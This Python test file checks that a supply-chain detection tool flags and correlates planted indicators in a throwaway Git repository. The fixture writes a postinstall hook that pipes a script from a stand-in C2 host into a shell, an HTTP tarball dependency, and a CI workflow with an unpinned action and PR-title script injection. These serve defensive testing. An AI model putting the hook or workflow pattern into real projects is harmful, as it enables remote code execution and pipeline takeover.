"""
Controlled Non-CVE Supply Chain Attack Demonstration Test Suite (Person 2 - Phase 2.1)

Validates the core research question:
"Can combining repository changes, dependency changes and pipeline changes
reveal suspicious activity that vulnerability databases cannot detect?"

Builds a disposable, isolated synthetic Git repository fixture introducing:
1. A new dependency with an unexpected dependency source (raw unencrypted HTTP tarball).
2. A suspicious install-time lifecycle hook (curl piped into shell).
3. A related CI/CD pipeline security weakness (unpinned third-party action + untrusted script injection).

Verifies that Guardian:
- Detects individual indicators across manifest diff, dependency sources, lifecycle scripts, and CI/CD pipelines.
- Correlates related indicators across vectors into defensible composite attack findings.
- Produces exact file, line, and commit SHA evidence without fabrication.
- Documents supporting and contradicting evidence for each scenario.
- Confirms complete independence from published CVEs or vulnerability databases (OSV/NVD).
- Never executes untrusted code or lifecycle scripts.
"""
from __future__ import annotations

import json
import os
import subprocess
import sys
from pathlib import Path

# Ensure repo root and src are on sys.path
_ROOT = Path(__file__).resolve().parent.parent
_SRC = _ROOT / "src"
if str(_ROOT) not in sys.path:
    sys.path.insert(0, str(_ROOT))
if str(_SRC) not in sys.path:
    sys.path.insert(0, str(_SRC))

import pytest

from change_analyzer import ChangeAnalyzer
from suspicious_changes.change_correlation import correlate_suspicious_changes

# Safe environment for subprocess executions conforming to platform AST security audit
SAFE_ENV = {
    k: v for k, v in os.environ.items()
    if not any(s in k.upper() for s in ("KEY", "TOKEN", "SECRET", "PASSWORD", "AUTH"))
}


def _git(args: list[str], cwd: Path, capture_output: bool = False, text: bool = False) -> subprocess.CompletedProcess:
    return subprocess.run(
        args,
        cwd=cwd,
        capture_output=capture_output,
        text=text,
        env=SAFE_ENV,
        shell=False,
    )


@pytest.fixture
def non_cve_attack_repo(tmp_path: Path):
    """
    Creates a disposable Git repository fixture simulating a controlled non-CVE supply chain attack.
    Base Commit: Clean baseline configuration.
    Head Commit: Introduces coordinated dependency, script, and CI/CD pipeline changes.
    """
    repo = tmp_path / "synthetic-supply-chain-repo"
    repo.mkdir(parents=True)

    _git(["git", "init"], cwd=repo, capture_output=True)
    _git(["git", "config", "user.name", "Security Auditor"], cwd=repo)
    _git(["git", "config", "user.email", "auditor@example.com"], cwd=repo)

    # --------------------------------------------------------------------------
    # Commit 1 (Base): Clean baseline with pinned dependencies and secure workflow
    # --------------------------------------------------------------------------
    base_pkg = {
        "name": "enterprise-web-service",
        "version": "1.0.0",
        "description": "Enterprise microservice baseline",
        "scripts": {
            "build": "tsc",
            "test": "jest"
        },
        "dependencies": {
            "express": "^4.18.2"
        }
    }
    (repo / "package.json").write_text(json.dumps(base_pkg, indent=2))

    wf_dir = repo / ".github" / "workflows"
    wf_dir.mkdir(parents=True)
    base_workflow = """name: Secure CI Build
on:
  push:
    branches: [main]

permissions:
  contents: read

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout Source
        uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11
      - name: Run Tests
        run: npm test
"""
    (wf_dir / "ci.yml").write_text(base_workflow)

    _git(["git", "add", "."], cwd=repo)
    _git(["git", "commit", "-m", "Baseline: secure build configuration"], cwd=repo)
    base_sha = _git(["git", "rev-parse", "HEAD"], cwd=repo, capture_output=True, text=True).stdout.strip()

    # --------------------------------------------------------------------------
    # Commit 2 (Head): Controlled Non-CVE Attack Vector Injection
    # --------------------------------------------------------------------------
    # 1. Dependency anomaly: introduces non-existent/fictional package from raw HTTP URL
    # 2. Lifecycle hook: registers postinstall hook downloading and piping script to shell
    head_pkg = {
        "name": "enterprise-web-service",
        "version": "1.0.1",
        "description": "Enterprise microservice baseline",
        "scripts": {
            "build": "tsc",
            "test": "jest",
            "postinstall": "curl -s http://c2.telemetry-edge.org/agent.sh | sh"
        },
        "dependencies": {
            "express": "^4.18.2",
            "analytics-telemetry": "http://pkg-cdn.telemetry-edge.org/dist/analytics-telemetry.tgz"
        }
    }
    (repo / "package.json").write_text(json.dumps(head_pkg, indent=2))

    # 3. Pipeline tampering: introduces unpinned 3rd-party action and untrusted expression injection
    head_workflow = """name: Secure CI Build
on:
  pull_request:
    types: [opened, synchronize]

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout Source
        uses: unvetted-vendor/uploader@v1
      - name: Log PR Information
        run: |
          echo "Processing PR: ${{ github.event.pull_request.title }}"
"""
    (wf_dir / "ci.yml").write_text(head_workflow)

    _git(["git", "add", "."], cwd=repo)
    _git(["git", "commit", "-m", "Telemetry update and CI pull request logging"], cwd=repo)
    head_sha = _git(["git", "rev-parse", "HEAD"], cwd=repo, capture_output=True, text=True).stdout.strip()

    return {
        "repo": repo,
        "base_sha": base_sha,
        "head_sha": head_sha,
        "fictional_pkg": "analytics-telemetry"
    }


def test_controlled_non_cve_attack_scenario(non_cve_attack_repo):
    """
    Validates end-to-end detection and multi-vector correlation of a controlled non-CVE scenario:
    1. Detects individual indicators across Git diff, dependency sources, lifecycle scripts, and CI/CD.
    2. Correlates indicators into composite attack findings.
    3. Verifies file, line, and commit SHA traceability.
    4. Confirms non-CVE independence (zero reliance on NVD/OSV).
    """
    repo = non_cve_attack_repo["repo"]
    base_sha = non_cve_attack_repo["base_sha"]
    head_sha = non_cve_attack_repo["head_sha"]
    fictional_pkg = non_cve_attack_repo["fictional_pkg"]

    analyzer = ChangeAnalyzer(repo_dir=repo, base_commit=base_sha, head_commit=head_sha)
    result = analyzer.run_investigation()

    findings = result["findings"]
    correlated = result["correlated_scenarios"]

    # --------------------------------------------------------------------------
    # 1. Verification of Individual Indicators (Deterministic Engine)
    # --------------------------------------------------------------------------
    finding_ids = [f["id"] for f in findings]

    # Indicator 1: Git Diff - Added dependency
    diff_added = next((f for f in findings if f["id"] == "DIFF-DEP-ADDED-ANALYTICS-TELEMETRY"), None)
    assert diff_added is not None, "Failed to detect added dependency in manifest Git diff"
    assert diff_added["evidence_type"] == "OBSERVED_CHANGE"
    assert diff_added["change_origin"] == "INTRODUCED_IN_RANGE"
    assert diff_added["commit_reference"]["sha"] == head_sha
    assert diff_added["affected_file"] == "package.json"
    assert diff_added["line_number"] > 0
    assert "+ \"analytics-telemetry\"" in diff_added["evidence"]

    # Indicator 2: Dependency Source - Insecure HTTP tarball
    src_tarball = next((f for f in findings if f["id"] == "SRC-TARBALL-DEP-ANALYTICS-TELEMETRY"), None)
    assert src_tarball is not None, "Failed to detect unencrypted HTTP tarball source"
    assert src_tarball["severity"] == "HIGH"
    assert "http://pkg-cdn.telemetry-edge.org" in src_tarball["evidence"]
    assert src_tarball["change_origin"] == "INTRODUCED_IN_RANGE"

    # Indicator 3: Lifecycle Script - Remote script piped to shell
    script_pipe = next((f for f in findings if "SCRIPT-PIPE_TO_SHELL" in f["id"]), None)
    assert script_pipe is not None, "Failed to detect dangerous lifecycle script piping curl to shell"
    assert script_pipe["severity"] == "CRITICAL"
    assert "curl -s http://c2.telemetry-edge.org/agent.sh | sh" in script_pipe["evidence"]
    assert script_pipe["affected_file"] == "package.json"
    assert script_pipe["line_number"] > 0
    assert script_pipe["change_origin"] == "INTRODUCED_IN_RANGE"

    # Indicator 4: CI/CD Pipeline - Unpinned third-party action
    ci_unpinned = next((f for f in findings if "SUSP-CICD-GHA001" in f["id"]), None)
    assert ci_unpinned is not None, "Failed to detect unpinned third-party GitHub Action"
    assert "unvetted-vendor/uploader@v1" in ci_unpinned["evidence"]
    assert ci_unpinned["affected_file"] == ".github/workflows/ci.yml"
    assert ci_unpinned["change_origin"] == "INTRODUCED_IN_RANGE"

    # Indicator 5: CI/CD Pipeline - Expression script injection
    ci_injection = next((f for f in findings if "SUSP-CICD-GHA003" in f["id"]), None)
    assert ci_injection is not None, "Failed to detect script injection in workflow run step"
    assert "github.event.pull_request.title" in ci_injection["evidence"]
    assert ci_injection["affected_file"] == ".github/workflows/ci.yml"
    assert ci_injection["change_origin"] == "INTRODUCED_IN_RANGE"

    # --------------------------------------------------------------------------
    # 2. Verification of Multi-Vector Correlation (Evidence Correlation Engine)
    # --------------------------------------------------------------------------
    assert len(correlated) >= 2, f"Expected at least 2 composite attack scenarios, found {len(correlated)}"

    # Scenario A: Dependency Injection + Install-Time Execution Hook
    dep_install_scenarios = [
        s for s in correlated
        if s["scenario_type"] in ("dependency_install_execution", "manifest_lifecycle_chain")
    ]
    assert len(dep_install_scenarios) >= 1, "Failed to correlate dependency and install execution hook"
    scen_a = dep_install_scenarios[0]

    assert scen_a["severity"] == "CRITICAL"
    assert scen_a["correlation_confidence"] == "HIGH"
    assert scen_a["status"] == "CONFIRMED_MULTI_VECTOR"
    assert "MITRE ATT&CK T1195.001" in scen_a["attack_technique"]
    assert "package.json" in scen_a["related_files"]
    assert any(diff_added["id"] in scen_a["primary_finding_ids"] or src_tarball["id"] in scen_a["primary_finding_ids"] for _ in [1])
    assert any("SCRIPT-PIPE_TO_SHELL" in pid for pid in scen_a["primary_finding_ids"])

    # Verify supporting evidence
    supporting_ids = [se["finding_id"] for se in scen_a["supporting_evidence"]]
    assert any("SCRIPT-PIPE_TO_SHELL" in sid for sid in supporting_ids)

    # Verify traceable relationships
    assert len(scen_a["traceable_relationships"]) >= 1
    rel = scen_a["traceable_relationships"][0]
    rel_type = rel.get("relationship") if isinstance(rel, dict) else rel.relationship
    rel_rationale = rel.get("rationale") if isinstance(rel, dict) else rel.rationale
    assert rel_type in ("triggers_execution_of", "co_located_in_manifest")
    assert rel_rationale

    # Verify research citations
    assert any("Ohm et al." in cit for cit in scen_a["citations"])

    # Scenario B: CI/CD Pipeline Hijacking & Command Injection
    pipeline_scenarios = [s for s in correlated if s["scenario_type"] == "pipeline_hijack"]
    assert len(pipeline_scenarios) == 1, "Failed to correlate CI/CD unpinned action and script injection"
    scen_b = pipeline_scenarios[0]

    assert scen_b["severity"] == "HIGH"
    assert "MITRE ATT&CK T1195.002" in scen_b["attack_technique"] or "T1059" in scen_b["attack_technique"]
    assert ".github/workflows/ci.yml" in scen_b["related_files"]
    assert ci_unpinned["id"] in scen_b["primary_finding_ids"]
    assert ci_injection["id"] in scen_b["primary_finding_ids"]
    assert any("Wang et al." in cit for cit in scen_b["citations"])

    # --------------------------------------------------------------------------
    # 3. Non-CVE Independence Confirmation
    # --------------------------------------------------------------------------
    # Confirm that 'analytics-telemetry' is an unknown uncatalogued package
    # with zero advisory references, proving discovery without NVD/CVE/OSV.
    for f in findings:
        if fictional_pkg in f.get("evidence", ""):
            assert not any("CVE-" in ref for ref in f.get("references", []))
            assert not any("GHSA-" in ref for ref in f.get("references", []))
